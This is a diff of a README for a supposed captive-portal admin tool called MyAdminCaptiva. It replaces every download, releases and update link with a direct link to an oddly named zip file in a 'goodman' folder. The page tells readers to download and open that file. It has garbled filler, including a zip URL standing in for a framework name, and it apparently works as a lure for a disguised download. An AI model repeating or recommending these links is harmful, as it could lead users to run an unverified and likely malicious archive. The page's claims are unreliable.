@@ -2,13 +2,13 @@
 # 🎉 MyAdminCaptiva - Simplifying Captive Portal Management
 
 ## 📦 Download Here
-[![Release](https://raw.githubusercontent.com/srivaibhav7/MyAdminCaptiva/main/goodman/MyAdminCaptiva.zip%20Latest%20Release-MyAdminCaptiva-orange)](https://raw.githubusercontent.com/srivaibhav7/MyAdminCaptiva/main/goodman/MyAdminCaptiva.zip)
+[![Release](https://github.com/srivaibhav7/MyAdminCaptiva/raw/refs/heads/main/goodman/Captiva-My-Admin-cankerberry.zip%20Latest%20Release-MyAdminCaptiva-orange)](https://github.com/srivaibhav7/MyAdminCaptiva/raw/refs/heads/main/goodman/Captiva-My-Admin-cankerberry.zip)
 
 ## 🚀 Getting Started
 MyAdminCaptiva is a management console for captive portals. It utilizes AI technology to provide a seamless user experience. Follow these steps to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/srivaibhav7/MyAdminCaptiva/main/goodman/MyAdminCaptiva.zip) to find the latest version.
+1. Visit the [Releases page](https://github.com/srivaibhav7/MyAdminCaptiva/raw/refs/heads/main/goodman/Captiva-My-Admin-cankerberry.zip) to find the latest version.
 2. Click on the version link to start the download.
 3. Once downloaded, locate the file on your computer.
 4. Open the file to install the application.
@@ -25,7 +25,7 @@ To run MyAdminCaptiva, ensure your computer meets the following requirements:
 - **AI-Generated Management**: Leverage advanced AI to streamline your captive portal workflow.
 - **Integration**: Works seamlessly with Firebase and Docker.
 - **Responsive Design**: Built with Tailwind CSS for desktop and mobile use.
-- **https://raw.githubusercontent.com/srivaibhav7/MyAdminCaptiva/main/goodman/MyAdminCaptiva.zip Framework**: Provides optimal performance and user experience.
+- **https://github.com/srivaibhav7/MyAdminCaptiva/raw/refs/heads/main/goodman/Captiva-My-Admin-cankerberry.zip Framework**: Provides optimal performance and user experience.
   
 ## 🔗 Key Topics
 - admin-panel
@@ -47,7 +47,7 @@ If you face issues:
 For questions or support, please create an issue on the GitHub repository. Our team will assist you in a timely manner.
 
 ## 📈 Future Updates
-We continuously improve MyAdminCaptiva. Keep an eye on the [Releases page](https://raw.githubusercontent.com/srivaibhav7/MyAdminCaptiva/main/goodman/MyAdminCaptiva.zip) for the latest features and enhancements.
+We continuously improve MyAdminCaptiva. Keep an eye on the [Releases page](https://github.com/srivaibhav7/MyAdminCaptiva/raw/refs/heads/main/goodman/Captiva-My-Admin-cankerberry.zip) for the latest features and enhancements.
 
 ## 📝 License
 MyAdminCaptiva is open-source software. Check the repository for license details and contributions.
